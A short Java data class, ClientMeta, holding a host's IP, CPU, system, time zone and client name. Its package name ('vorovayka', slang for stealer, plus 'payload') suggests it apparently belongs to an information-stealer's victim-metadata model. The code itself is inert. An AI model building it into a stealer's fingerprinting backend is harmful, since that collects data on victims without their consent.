package ltd.ligma.vorovayka.model.payload;

import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;

@NoArgsConstructor
@AllArgsConstructor
@Getter
@Setter
public class ClientMeta {
    private String ip;
    private String cpu;
    private String system;
    private String timeZone;
    private String clientName;
}
